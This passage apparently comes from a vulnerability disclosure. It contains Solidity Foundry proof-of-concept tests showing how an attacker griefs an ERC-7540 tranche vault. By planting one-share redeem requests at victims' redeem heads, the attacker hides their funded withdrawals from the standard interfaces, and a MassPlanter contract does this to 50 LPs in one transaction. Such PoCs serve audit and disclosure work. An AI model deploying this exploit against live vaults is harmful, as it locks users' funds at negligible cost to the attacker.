        assertFalse(pool.lpEpochSettlementPaused(), "rel: LP settlement not paused");
    }

    function _pocActor(
        string memory name
    ) internal returns (address actor) {
        actor = makeAddr(name);
    }

    function _pocRequireActor(
        address actor
    ) internal view {
        require(actor != address(0), "PocBase: zero actor");
        require(actor != address(this), "PocBase: owner cannot act in a PoC");
        require(
            actor != address(engine) && actor != address(engineAdmin) && actor != address(engine.settlementSidecar())
                && actor != address(engine.planningReader()) && actor != address(terminalNavBook)
                && actor != address(pool) && actor != address(seniorVault) && actor != address(juniorVault)
                && actor != address(clearinghouse) && actor != address(router) && actor != address(routerAdmin)
                && actor != address(router.lifecycleBook()) && actor != address(router.positionProtectionBook())
                && actor != router.liquidationBatchSidecar() && actor != router.executionSidecar()
                && actor != address(pletherOracle) && actor != address(baseMockPyth)
                && actor != address(settlementToken) && actor != engine.protocolTreasury()
                && actor != address(pool.ENGINE_PROTOCOL_LENS()),
            "PocBase: protocol address cannot act in a PoC"
        );
    }

    function _pocEnsureEth(
        address actor,
        uint256 weiAmount
    ) internal {
        if (actor.balance < weiAmount) {
            vm.deal(actor, weiAmount);
        }
    }

    function _pocMintUsdg(
        address actor,
        uint256 assets
    ) internal {
        settlementToken.mint(actor, assets);
    }

    function _vaultOf(
        bool senior
    ) internal view returns (TrancheVault) {
        return senior ? seniorVault : juniorVault;
    }

    function _lpRequestDeposit(
        address lp,
        bool senior,
        uint256 assets
    ) internal returns (uint256 requestId) {
        _pocRequireActor(lp);
        TrancheVault vault = _vaultOf(senior);
        _pocMintUsdg(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        pocLastDepositRequest[lp][senior] = requestId;
    }

    function _lpClaimShares(
        address lp,
        bool senior
    ) internal returns (uint256 shares) {
        return _lpClaimShares(lp, senior, pocLastDepositRequest[lp][senior]);
    }

    function _lpClaimShares(
        address lp,
        bool senior,
        uint256 requestId
    ) internal returns (uint256 shares) {
        _pocRequireActor(lp);
        TrancheVault vault = _vaultOf(senior);
        uint256 assets = vault.claimableDepositRequest(requestId, lp);
        require(assets > 0, "PocBase: no claimable deposit");
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, assets, lp, lp);
    }

    function _lpRequestRedeem(
        address lp,
        bool senior,
        uint256 shares
    ) internal returns (uint256 requestId) {
        _pocRequireActor(lp);
        vm.prank(lp);
        requestId = _vaultOf(senior).requestRedeem(shares, lp, lp);
    }

    function _warpToLpEpoch(
        uint256 epochId
    ) internal {
        uint256 start = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < start) {
            _pocWarpTo(start);
            vm.roll(vm.getBlockNumber() + 1);
        }
    }

    function _warpPastLpCooldown(
        address lp,
        bool senior
    ) internal {
        TrancheVault vault = _vaultOf(senior);
        uint256 readyAt = vault.lastDepositTime(lp) + vault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < readyAt) {
            _pocWarpTo(readyAt);
            vm.roll(vm.getBlockNumber() + 1);
        }
    }

    function _settleLpEpochPublic(
        address keeper
    ) internal returns (bool viaRouter) {
        _pocRequireActor(keeper);
        ICfdEngineTypes.TerminalNavSnapshot memory snapshot = engine.terminalNavSnapshot();
        if (!snapshot.hasOpenPositions || engine.isOracleFrozen()) {
            vm.prank(keeper);
            pool.settleLpEpoch(0, 0);
            return false;
        }
        _pocTick();
        uint256 nowTs = vm.getBlockTimestamp();
        bytes[] memory data = _pythPayload(pocPrice, 0, nowTs, nowTs - 1);
        uint256 fee = router.pletherOracle().getUpdateFee(data);
        _pocEnsureEth(keeper, fee);
        vm.prank(keeper);
        router.settleLpEpoch{value: fee}(data);
        return true;
    }

    function _pocTick() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _pocWarpTo(
        uint256 timestamp
    ) internal {
        require(timestamp >= vm.getBlockTimestamp(), "PocBase: time must move forward");
        vm.warp(timestamp);
    }

    function _pocFeedRawPrice(
        uint256 i,
        uint256 basketPrice
    ) internal view returns (uint256) {
        PletherOracle oracle = PletherOracle(address(router.pletherOracle()));
        require(!oracle.inversions(i), "PocBase: inverted components unsupported");
        return (basketPrice * oracle.basePrices(i)) / 1e8;
    }

    function _pythPayload(
        uint256 basketPrice,
        uint64 basketConfidence,
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(
                    SafeCast.toInt64(SafeCast.toInt256(_pocFeedRawPrice(i, basketPrice))),
                    SafeCast.toUint64(_pocFeedRawPrice(i, basketConfidence)),
                    -8,
                    publishTime,
                    prevPublishTime
                )
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _setPrice(
        uint256 price
    ) internal {
        pocPrice = price;
        bytes32[] memory ids = _basePythFeedIds();
        uint256 nowTs = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            baseMockPyth.setPrice(
                ids[i], SafeCast.toInt64(SafeCast.toInt256(_pocFeedRawPrice(i, price))), uint64(0), int32(-8), nowTs
            );
        }
    }

    function _updateMark(
        address keeper,
        uint256 price
    ) internal {
        _updateMark(keeper, price, 0);
    }

    function _updateMark(
        address keeper,
        uint256 price,
        uint64 confidence
    ) internal {
        _pocRequireActor(keeper);
        _pocTick();
        uint256 nowTs = vm.getBlockTimestamp();
        bytes[] memory data = _pythPayload(price, confidence, nowTs, nowTs - 1);
        uint256 fee = router.pletherOracle().getUpdateFee(data);
        _pocEnsureEth(keeper, fee);
        vm.prank(keeper);
        router.updateMarkPrice{value: fee}(data);
        pocPrice = price;
    }

    function _isFadOrFrozen() internal view returns (bool) {
        return engine.isFadWindow() || engine.isOracleFrozen();
    }

    function _pocMax(
        uint256 a,
        uint256 b
    ) internal pure returns (uint256) {
        return a > b ? a : b;
    }

}
```

</details>

<details>
<summary><code>RedeemHeadPlant.t.sol</code> (click to expand)</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PocBase} from "./PocBase.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IERC7540} from "@plether/perps/interfaces/IERC7540.sol";
import {console2} from "forge-std/console2.sol";

contract StandardSurfaceHolder {

    IERC7540 public immutable vault;
    IERC20 public immutable assetToken;
    address public immutable admin;

    modifier onlyAdmin() {
        require(msg.sender == admin, "NOT_ADMIN");
        _;
    }

    constructor(
        IERC7540 vault_,
        address admin_
    ) {
        vault = vault_;
        assetToken = IERC20(vault_.asset());
        admin = admin_;
    }

    function requestDeposit(
        uint256 assets
    ) external onlyAdmin returns (uint256 requestId) {
        assetToken.approve(address(vault), assets);
        requestId = vault.requestDeposit(assets, address(this), address(this));
    }

    function claimDeposit() external onlyAdmin returns (uint256 shares) {
        uint256 assets = vault.maxDeposit(address(this));
        require(assets > 0, "NOTHING_CLAIMABLE");
        shares = vault.deposit(assets, address(this), address(this));
    }

    function requestRedeemAll() external onlyAdmin returns (uint256 requestId) {
        uint256 shares = IERC20(vault.share()).balanceOf(address(this));
        requestId = vault.requestRedeem(shares, address(this), address(this));
    }

    function claimRedeemAll(
        address to
    ) external onlyAdmin returns (uint256 assets) {
        uint256 shares = vault.maxRedeem(address(this));
        require(shares > 0, "NOTHING_CLAIMABLE");
        assets = vault.redeem(shares, to, address(this));
    }

    function claimWithdrawAll(
        address to
    ) external onlyAdmin returns (uint256 shares) {
        uint256 assets = vault.maxWithdraw(address(this));
        require(assets > 0, "NOTHING_CLAIMABLE");
        shares = vault.withdraw(assets, to, address(this));
    }

    function redeemExact(
        uint256 shares,
        address to
    ) external onlyAdmin returns (uint256) {
        return vault.redeem(shares, to, address(this));
    }

    function withdrawExact(
        uint256 assets,
        address to
    ) external onlyAdmin returns (uint256) {
        return vault.withdraw(assets, to, address(this));
    }

}

contract MassPlanter {

    function plant(
        IERC7540 vault,
        address from,
        address[] calldata controllers
    ) external returns (uint256 gasPerPlant) {
        IERC20 share = IERC20(vault.share());
        uint256 g0 = gasleft();
        for (uint256 i; i < controllers.length; ++i) {
            share.transferFrom(from, address(this), 1);
            vault.requestRedeem(1, controllers[i], address(this));
        }
        gasPerPlant = (g0 - gasleft()) / controllers.length;
    }

}

contract RedeemHeadPlantTest is PocBase {

    uint256 internal constant VICTIM_ASSETS = 10_000e6;

    uint256 internal attackerSharesBeforeFirstPlant;

    function _newIntegrator(
        string memory adminName
    ) internal returns (StandardSurfaceHolder integ, address integAdmin) {
        integAdmin = _pocActor(adminName);
        vm.prank(integAdmin);
        integ = new StandardSurfaceHolder(IERC7540(address(juniorVault)), integAdmin);
        _pocRequireActor(address(integ));
    }

    function _onboard(
        address attacker,
        address[] memory eoas,
        StandardSurfaceHolder[] memory integs,
        address[] memory integAdmins
    ) internal {
        uint256 minAssets = pool.minTrancheDepositAssets();
        uint256 epoch = _lpRequestDeposit(attacker, false, minAssets);
        for (uint256 i; i < eoas.length; ++i) {
            assertEq(_lpRequestDeposit(eoas[i], false, VICTIM_ASSETS), epoch, "same deposit epoch");
        }
        for (uint256 i; i < integs.length; ++i) {
            _pocMintUsdg(address(integs[i]), VICTIM_ASSETS);
            vm.prank(integAdmins[i]);
            assertEq(integs[i].requestDeposit(VICTIM_ASSETS), epoch, "same deposit epoch");
        }
        _warpToLpEpoch(epoch);
        _settleLpEpochPublic(pocKeeper);
        assertGt(_lpClaimShares(attacker, false), 0, "attacker shares");
        for (uint256 i; i < eoas.length; ++i) {
            assertGt(_lpClaimShares(eoas[i], false), 0, "victim shares");
        }
        for (uint256 i; i < integs.length; ++i) {
            vm.prank(integAdmins[i]);
            assertGt(integs[i].claimDeposit(), 0, "integrator shares via standard deposit()");
        }
        _warpPastLpCooldown(attacker, false);
    }

    function _plant(
        address attacker,
        string memory freshName,
        address victimController
    ) internal returns (uint256 epochId, uint256 gasUsed) {
        address fresh = _pocActor(freshName);
        _pocRequireActor(attacker);
        _pocRequireActor(fresh);
        assertFalse(juniorVault.isOperator(victimController, fresh), "no operator approval from victim");
        assertFalse(juniorVault.isOperator(victimController, attacker), "no operator approval from victim");
        uint256 g0 = gasleft();
        vm.prank(attacker);
        juniorVault.transfer(fresh, 1);
        vm.prank(fresh);
        epochId = juniorVault.requestRedeem(1, victimController, fresh);
        gasUsed = g0 - gasleft();
        assertEq(juniorVault.balanceOf(fresh), 0, "fresh spent its single share");
        assertLt(juniorVault.estimateRedeemAssets(1), pool.minTrancheDepositAssets(), "below request minimum");
    }

    function _attackerValue(
        address attacker
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(attacker));
    }

    function test_refundedPlantedHead_blocksStandardOnlyIntegrator() public {
        address attacker = _pocActor("attacker");
        address stranger = _pocActor("stranger");
        (StandardSurfaceHolder integ, address integAdmin) = _newIntegrator("victimIntegratorAdmin");
        (StandardSurfaceHolder ctrl, address ctrlAdmin) = _newIntegrator("controlIntegratorAdmin");
        {
            StandardSurfaceHolder[] memory integs = new StandardSurfaceHolder[](2);
            address[] memory admins = new address[](2);
            integs[0] = integ;
            integs[1] = ctrl;
            admins[0] = integAdmin;
            admins[1] = ctrlAdmin;
            _onboard(attacker, new address[](0), integs, admins);
        }
        uint256 attackerShares0 = juniorVault.balanceOf(attacker);
        uint256 attackerValue0 = _attackerValue(attacker);
        uint256 integShares = juniorVault.balanceOf(address(integ));
        console2.log("attacker shares after public deposit of min assets", attackerShares0);
        console2.log("victim integrator shares", integShares);

        (uint256 dustEpoch, uint256 plantGas) = _plant(attacker, "attackerFresh1", address(integ));
        assertEq(juniorVault.controllerRedeemHead(address(integ)), dustEpoch, "planted at the victim's redeem head");
        assertEq(juniorVault.balanceOf(attacker), attackerShares0 - 1, "attacker spent 1 share atom");

        _warpToLpEpoch(dustEpoch);
        _settleLpEpochPublic(pocKeeper);
        assertTrue(juniorVault.redeemRefundPending(dustEpoch, address(integ)), "planted head refundable");
        assertEq(juniorVault.refundableRedeemRequest(dustEpoch, address(integ)), 1, "1 share refundable");

        vm.prank(integAdmin);
        uint256 req = integ.requestRedeemAll();
        vm.prank(ctrlAdmin);
        uint256 reqCtrl = ctrl.requestRedeemAll();
        assertEq(req, reqCtrl, "same redeem epoch");
        assertGt(req, dustEpoch, "victim request is behind the planted head");
        _warpToLpEpoch(req);
        _settleLpEpochPublic(pocKeeper);
        uint256 fundedAt = vm.getBlockTimestamp();
        uint256 fundedShares = juniorVault.claimableRedeemRequest(req, address(integ));
        uint256 fundedAssets = juniorVault.claimableRedeemAssets(req, address(integ));
        assertEq(fundedShares, integShares, "victim request fully funded");
        assertGt(fundedAssets, 9_990e6, "victim funded assets ~10,000 USDG");

        uint256 ctrlFunded = juniorVault.claimableRedeemAssets(reqCtrl, address(ctrl));
        assertEq(juniorVault.maxWithdraw(address(ctrl)), ctrlFunded, "control maxWithdraw shows funds");
        vm.prank(ctrlAdmin);
        uint256 ctrlOut = ctrl.claimRedeemAll(ctrlAdmin);
        assertEq(ctrlOut, ctrlFunded, "control integrator paid in full");
        assertEq(settlementToken.balanceOf(ctrlAdmin), ctrlFunded, "control admin received USDG");

        assertEq(juniorVault.controllerRedeemHead(address(integ)), dustEpoch, "head is still the planted epoch");
        assertEq(juniorVault.maxRedeem(address(integ)), 0, "maxRedeem = 0 despite funded request");
        assertEq(juniorVault.maxWithdraw(address(integ)), 0, "maxWithdraw = 0 despite funded request");
        vm.prank(integAdmin);
        vm.expectRevert(bytes("NOTHING_CLAIMABLE"));
        integ.claimRedeemAll(integAdmin);
        vm.prank(integAdmin);
        vm.expectRevert(bytes("NOTHING_CLAIMABLE"));
        integ.claimWithdrawAll(integAdmin);
        vm.prank(integAdmin);
        vm.expectRevert(
            abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, address(integ), fundedShares, 0)
        );
        integ.redeemExact(fundedShares, integAdmin);
        vm.prank(integAdmin);
        vm.expectRevert(
            abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, address(integ), fundedAssets, 0)
        );
        integ.withdrawExact(fundedAssets, integAdmin);

        vm.prank(stranger);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeemRefund(dustEpoch, address(integ), address(integ));
        vm.prank(attacker);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeemRefund(dustEpoch, address(integ), address(integ));
        vm.prank(stranger);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeem(req, fundedShares, address(integ), address(integ));

        uint256[3] memory waits = [uint256(1 hours), 24 hours, 365 days];
        for (uint256 i; i < waits.length; ++i) {
            _pocWarpTo(fundedAt + waits[i]);
            vm.roll(vm.getBlockNumber() + 1);
            assertEq(juniorVault.maxRedeem(address(integ)), 0, "still maxRedeem 0");
            assertEq(juniorVault.maxWithdraw(address(integ)), 0, "still maxWithdraw 0");
            vm.prank(integAdmin);
            vm.expectRevert(bytes("NOTHING_CLAIMABLE"));
            integ.claimRedeemAll(integAdmin);
            vm.prank(integAdmin);
            vm.expectRevert(bytes("NOTHING_CLAIMABLE"));
            integ.claimWithdrawAll(integAdmin);
            assertEq(juniorVault.claimableRedeemAssets(req, address(integ)), fundedAssets, "funded assets intact");
            console2.log("seconds since funding, integrator standard surface still 0", vm.getBlockTimestamp() - fundedAt);
        }
        uint256 elapsedSinceFunding = vm.getBlockTimestamp() - fundedAt;
        assertGe(elapsedSinceFunding, 24 hours, ">= 24 h");
        assertGe(elapsedSinceFunding, 365 days, ">= 365 days");
        assertGe(settlementToken.balanceOf(address(juniorVault)), fundedAssets, "assets sit in vault escrow");
        assertEq(settlementToken.balanceOf(address(integ)), 0, "integrator received nothing");
        assertEq(settlementToken.balanceOf(integAdmin), 0, "integrator admin received nothing");
        assertEq(juniorVault.balanceOf(address(integ)), 0, "integrator holds no shares either");

        uint256 attackerValue1 = _attackerValue(attacker);
        uint256 attackerCostAtoms = attackerValue0 - attackerValue1;
        assertLe(attackerCostAtoms, 1, "attacker value cost <= 1 USDG atom");
        assertEq(juniorVault.convertToAssets(1), 0, "1 share atom is worth 0 USDG atoms");
        console2.log("attacker share atoms spent", attackerShares0 - juniorVault.balanceOf(attacker));
        console2.log("attacker USDG-atom value lost (convertToAssets delta)", attackerCostAtoms);
        console2.log("attacker gas for transfer+requestRedeem (gasleft delta)", plantGas);
        console2.log("victim integrator funded USDG atoms unreachable via ERC-7540/4626", fundedAssets);
        console2.log("control integrator USDG atoms paid through the same code", ctrlOut);
        console2.log("last check after funding, seconds (lower bound, chosen warp)", elapsedSinceFunding);

        _assertReleaseParams();
    }

    function _eoaScenario(
        address attacker,
        address victim
    ) internal returns (uint256 dustEpoch, uint256 req, uint256 reqShares, uint256 funded) {
        address[] memory eoas = new address[](1);
        eoas[0] = victim;
        _onboard(attacker, eoas, new StandardSurfaceHolder[](0), new address[](0));
        attackerSharesBeforeFirstPlant = juniorVault.balanceOf(attacker);
        (dustEpoch,) = _plant(attacker, "attackerFresh1", victim);
        assertEq(juniorVault.controllerRedeemHead(victim), dustEpoch, "planted at victim head");
        _warpToLpEpoch(dustEpoch);
        _settleLpEpochPublic(pocKeeper);
        assertTrue(juniorVault.redeemRefundPending(dustEpoch, victim), "planted head refundable");

        reqShares = juniorVault.balanceOf(victim) / 2;
        req = _lpRequestRedeem(victim, false, reqShares);
        assertGt(req, dustEpoch, "victim request behind planted head");
        _warpToLpEpoch(req);
        _settleLpEpochPublic(pocKeeper);
        funded = juniorVault.claimableRedeemAssets(req, victim);
        assertEq(juniorVault.claimableRedeemRequest(req, victim), reqShares, "fully funded");
        assertGt(funded, 4_990e6, "~5,000 USDG funded");

        assertEq(juniorVault.maxRedeem(victim), 0, "maxRedeem hides funded request");
        assertEq(juniorVault.maxWithdraw(victim), 0, "maxWithdraw hides funded request");
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, victim, reqShares, 0));
        juniorVault.redeem(reqShares, victim, victim);
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, victim, funded, 0));
        juniorVault.withdraw(funded, victim, victim);
    }

    function test_eoaVictim_standardClaimsRevert_explicitIdClaimPays() public {
        address attacker = _pocActor("attacker");
        address victim = _pocActor("victimLp");
        address victimOther = _pocActor("victimOtherWallet");
        (uint256 dustEpoch, uint256 req, uint256 reqShares, uint256 funded) = _eoaScenario(attacker, victim);

        uint256 cooldownBefore = juniorVault.lastDepositTime(victim);
        vm.prank(victim);
        uint256 out = juniorVault.claimRedeem(req, reqShares, victim, victim);
        assertEq(out, funded, "explicit-id claim pays the funded request");
        assertEq(settlementToken.balanceOf(victim), funded, "victim received USDG");
        assertEq(juniorVault.lastDepositTime(victim), cooldownBefore, "no cooldown restart");
        vm.prank(victim);
        juniorVault.transfer(victimOther, 1);
        assertEq(juniorVault.controllerRedeemHead(victim), dustEpoch, "planted head remains");
        assertEq(juniorVault.maxRedeem(victim), 0, "standard view still 0");
        console2.log("EOA explicit claimRedeem(requestId) USDG atoms", out);

        _assertReleaseParams();
    }

    function test_eoaVictim_reclaimRestartsWalletCooldown_andPlantRepeats() public {
        address attacker = _pocActor("attacker");
        address victim = _pocActor("victimLp");
        address victimOther = _pocActor("victimOtherWallet");
        uint256 attackerShares0;
        (uint256 dustEpoch, uint256 req, uint256 reqShares, uint256 funded) = _eoaScenario(attacker, victim);
        attackerShares0 = attackerSharesBeforeFirstPlant;
        assertEq(juniorVault.balanceOf(attacker), attackerShares0 - 1, "first plant cost exactly 1 share atom");
        uint256 walletShares = juniorVault.balanceOf(victim);
        assertGt(walletShares, 0, "victim keeps the other half in its wallet");

        uint256 t0 = vm.getBlockTimestamp();
        vm.prank(victim);
        uint256 refunded = juniorVault.claimRedeemRefund(dustEpoch, victim, victim);
        assertEq(refunded, 1, "1 share refunded");
        assertEq(juniorVault.lastDepositTime(victim), t0, "cooldown restarted at refund time");
        assertEq(juniorVault.controllerRedeemHead(victim), req, "head advanced to the real request");
        assertEq(juniorVault.maxRequestRedeem(victim), 0, "no new redeem request possible");
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(victimOther, walletShares);
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(walletShares, victim, victim);

        assertEq(juniorVault.maxRedeem(victim), reqShares, "standard view restored");
        vm.prank(victim);
        assertEq(juniorVault.redeem(reqShares, victim, victim), funded, "standard redeem pays");

        _pocWarpTo(t0 + 1 hours - 1);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(victimOther, 1);
        _pocWarpTo(t0 + 1 hours);
        vm.roll(vm.getBlockNumber() + 1);
        assertEq(juniorVault.maxRequestRedeem(victim), walletShares + 1, "wallet unlocked after exactly 1 h");
        console2.log("victim wallet share atoms locked by the cooldown", walletShares + 1);
        console2.log("cooldown end bracketed: locked at +3599 s, unlocked at +s", vm.getBlockTimestamp() - t0);

        (uint256 dustEpoch2,) = _plant(attacker, "attackerFresh2", victim);
        assertEq(juniorVault.controllerRedeemHead(victim), dustEpoch2, "new planted head");
        _warpToLpEpoch(dustEpoch2);
        _settleLpEpochPublic(pocKeeper);
        uint256 rest = juniorVault.balanceOf(victim);
        uint256 req2 = _lpRequestRedeem(victim, false, rest);
        assertGt(req2, dustEpoch2, "behind the new head");
        _warpToLpEpoch(req2);
        _settleLpEpochPublic(pocKeeper);
        uint256 funded2 = juniorVault.claimableRedeemAssets(req2, victim);
        assertGt(funded2, 4_990e6, "second request funded");
        assertEq(juniorVault.maxRedeem(victim), 0, "standard view blinded again");
        assertEq(juniorVault.maxWithdraw(victim), 0, "standard view blinded again");
        assertEq(attackerShares0 - juniorVault.balanceOf(attacker), 2, "attacker spent 2 share atoms in total");
        console2.log("repeat: victim funded USDG atoms hidden again", funded2);

        _assertReleaseParams();
    }

    function test_plantBehindExistingRequest_blocksNextRequest() public {
        address attacker = _pocActor("attacker");
        address victim = _pocActor("victimLp");
        address[] memory eoas = new address[](1);
        eoas[0] = victim;
        _onboard(attacker, eoas, new StandardSurfaceHolder[](0), new address[](0));
        _warpPastLpCooldown(victim, false);

        uint256 half = juniorVault.balanceOf(victim) / 2;
        uint256 req1 = _lpRequestRedeem(victim, false, half);
        _warpToLpEpoch(req1);
        (uint256 e2,) = _plant(attacker, "attackerFresh1", victim);
        assertGt(e2, req1, "plant lands in a later window");
        assertEq(juniorVault.controllerRedeemHead(victim), req1, "victim's own request stays head");
        _settleLpEpochPublic(pocKeeper);

        uint256 m1 = juniorVault.maxRedeem(victim);
        assertEq(m1, half, "existing request visible via standard view");
        vm.prank(victim);
        uint256 out1 = juniorVault.redeem(m1, victim, victim);
        assertGt(out1, 4_990e6, "existing request paid via standard redeem");
        assertEq(juniorVault.controllerRedeemHead(victim), e2, "planted position is now the head");

        _warpToLpEpoch(e2);
        _settleLpEpochPublic(pocKeeper);
        assertTrue(juniorVault.redeemRefundPending(e2, victim), "planted head refundable");
        uint256 rest = juniorVault.balanceOf(victim);
        uint256 req3 = _lpRequestRedeem(victim, false, rest);
        _warpToLpEpoch(req3);
        _settleLpEpochPublic(pocKeeper);
        uint256 funded3 = juniorVault.claimableRedeemAssets(req3, victim);
        assertGt(funded3, 4_990e6, "next request funded");
        assertEq(juniorVault.maxRedeem(victim), 0, "next request hidden from maxRedeem");
        assertEq(juniorVault.maxWithdraw(victim), 0, "next request hidden from maxWithdraw");
        console2.log("behind-existing: first request paid via standard redeem", out1);
        console2.log("behind-existing: next funded request hidden from standard surface", funded3);

        _assertReleaseParams();
    }

    function test_documentedRecovery_requestWholeWalletThenReclaim() public {
        address attacker = _pocActor("attacker");
        address victim = _pocActor("victimLp");
        address[] memory eoas = new address[](1);
        eoas[0] = victim;
        _onboard(attacker, eoas, new StandardSurfaceHolder[](0), new address[](0));

        (uint256 e1,) = _plant(attacker, "attackerFresh1", victim);
        _warpToLpEpoch(e1);
        _settleLpEpochPublic(pocKeeper);
        assertTrue(juniorVault.redeemRefundPending(e1, victim), "planted head refundable");
        uint256 all = juniorVault.balanceOf(victim);
        uint256 req = _lpRequestRedeem(victim, false, all);
        _warpToLpEpoch(req);
        _settleLpEpochPublic(pocKeeper);
        uint256 funded = juniorVault.claimableRedeemAssets(req, victim);
        assertEq(juniorVault.maxRedeem(victim), 0, "standard view hidden before reclaim");

        uint256 t0 = vm.getBlockTimestamp();
        vm.startPrank(victim);
        uint256 refunded = juniorVault.claimRedeemRefund(e1, victim, victim);
        uint256 m = juniorVault.maxRedeem(victim);
        uint256 out = juniorVault.redeem(m, victim, victim);
        vm.stopPrank();
        assertEq(refunded, 1, "1 share atom refunded");
        assertEq(out, funded, "full funded amount via standard redeem after reclaim, same block");
        assertEq(juniorVault.lastDepositTime(victim), t0, "cooldown restarted");
        assertEq(juniorVault.balanceOf(victim), 1, "only the refunded atom sits under the cooldown");
        assertEq(juniorVault.convertToAssets(1), 0, "that atom is worth 0 USDG atoms");
        assertEq(juniorVault.controllerRedeemHead(victim), 0, "redeem list empty");
        console2.log("recovery: paid via reclaim + standard redeem in one block", out);
        console2.log("recovery: share atoms under restarted cooldown", juniorVault.balanceOf(victim));

        _assertReleaseParams();
    }

    function test_massPlant_oneTransactionBlindsManyLps() public {
        address attacker = _pocActor("attacker");
        address victim = _pocActor("victimLp");
        address[] memory eoas = new address[](1);
        eoas[0] = victim;
        _onboard(attacker, eoas, new StandardSurfaceHolder[](0), new address[](0));

        uint256 n = 50;
        address[] memory targets = new address[](n);
        targets[0] = victim;
        for (uint256 i = 1; i < n; ++i) {
            targets[i] = _pocActor(string.concat("otherLp", vm.toString(i)));
        }
        vm.startPrank(attacker);
        MassPlanter planter = new MassPlanter();
        juniorVault.approve(address(planter), n);
        uint256 gasPerPlant = planter.plant(IERC7540(address(juniorVault)), attacker, targets);
        vm.stopPrank();
        uint256 epoch = juniorVault.controllerRedeemHead(victim);
        for (uint256 i; i < n; ++i) {
            assertEq(juniorVault.controllerRedeemHead(targets[i]), epoch, "every target planted in one tx");
        }

        _warpToLpEpoch(epoch);
        _settleLpEpochPublic(pocKeeper);
        assertTrue(juniorVault.redeemRefundPending(epoch, victim), "planted head refundable");
        uint256 reqShares = juniorVault.balanceOf(victim) / 2;
        uint256 req = _lpRequestRedeem(victim, false, reqShares);
        _warpToLpEpoch(req);
        _settleLpEpochPublic(pocKeeper);
        uint256 funded = juniorVault.claimableRedeemAssets(req, victim);
        assertGt(funded, 4_990e6, "victim request funded");
        assertEq(juniorVault.maxRedeem(victim), 0, "hidden from maxRedeem");
        assertEq(juniorVault.maxWithdraw(victim), 0, "hidden from maxWithdraw");
        console2.log("addresses planted in one transaction", n);
        console2.log("gas per plant inside the helper (no cheatcodes)", gasPerPlant);
        console2.log("victim funded USDG atoms hidden after the mass plant", funded);

        _assertReleaseParams();
    }

}
```
